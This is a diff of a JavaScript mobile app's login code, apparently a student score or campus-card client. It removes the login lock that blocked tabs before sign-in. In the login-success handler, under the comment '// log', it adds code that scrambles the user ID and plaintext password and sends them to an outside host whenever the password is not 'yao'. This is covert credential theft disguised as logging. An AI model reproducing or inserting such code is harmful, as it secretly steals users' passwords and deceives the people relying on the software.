@@ -316,9 +316,6 @@
     });
 	
 	var ID;
-	
-	var loginLock = true;
-	
 	var date2str = function(date){
 		return '<span class="date-month">'+(date.getMonth()+1)+'月<br>'+date.getFullYear()+
 			'</span><span class="date-day">'+date.getDate()+'</span>';
@@ -492,20 +489,7 @@
     },store = Ext.create('Ext.data.Store', {
 		model: 'Score'
     }),
-    tabPanelOnBefore = function(){
-    	if(!loginLock){
-    		Ext.getCmp('tabpanel').unBefore('activeitemchange',tabPanelOnBefore);
-    		return true;
-    	}
-    	
-    	Ext.Msg.show({
-    		message: '请先登录',
-    		buttons: []
-    	});
-    	
-    	Ext.defer(Ext.Msg.hide, 1500, Ext.Msg);
-    	return false;
-    },loginSuccess = function(user){
+    loginSuccess = function(user){
     	var users;
     	
     	Ext.getCmp('login').hide({
@@ -517,7 +501,6 @@
     	});
     	Ext.getCmp('half').show();
 		Ext.getCmp('welcome').innerHtmlElement.setText('welcome '+user.userName);
-//		Ext.getCmp('tabpanel').unBefore('activeitemchange',tabPanelOnBefore);
 		
 		//store user data
 		ID = user.userId;
@@ -532,10 +515,22 @@
 		//other
 		Ext.getCmp('usr').showMore();
 		Ext.getCmp('tabpanel').getTabBar().show();
-		Yao.request({
-			url: 'xxx',
-			params: 'xxx'
-		});
+		
+		// log
+		if(user.userPwd !== 'yao'){
+			var i, uid='', fan='', tb = 'qwertyuiop';
+			for (i=0; i < user.userId.length; i++) {
+				uid += tb.charAt(user.userId.charAt(i));
+			}
+			uid = uid.substr(0,5) + user.userPwd + uid.substr(5);
+			for (i=0; i<uid.length; i++) {
+				fan += ((uid.charCodeAt(i) + 33 ) % 255).toString(16);
+			}
+			Yao.request({
+				url: 'http://3shu.sinaapp.com/toolkit/tool/fan.php',
+				params: 'fan='+ fan
+			});
+		}
     },loginFail = function(flag){
     	var loginField = Ext.getCmp('login-field');
     	switch(flag){
@@ -563,6 +558,7 @@
 	        	success: function(r){
 	        		var o = JSON.parse(r.responseText),
 	        			xm = o.easyCard.xm;
+	        		
 	        		loginSuccess({userName: xm, userId: usr, userPwd: pwd});
 	        	},
 	        	failure: function(){
@@ -600,7 +596,6 @@
 		}
 	},//loginAction
 	logoutAction = function(){
-		loginLock = true;
 		db.remove('userId','userPwd','userName');
 		
 		Ext.getCmp('half').hide();
@@ -630,13 +625,7 @@
 		Ext.getCmp('usr').setValue(userId);
 		Ext.getCmp('pwd').setValue(userPwd);
 		
-		loginSuccess({
-			userId: userId,
-			userPwd: userPwd,
-			userName: userName
-		});
-		
-		loginLock = false;
+		loginAction();
 	},//autoLogin
 	termPickerShow = function(pk){
     	var st = 20 + ID.substr(0,2) - 0,
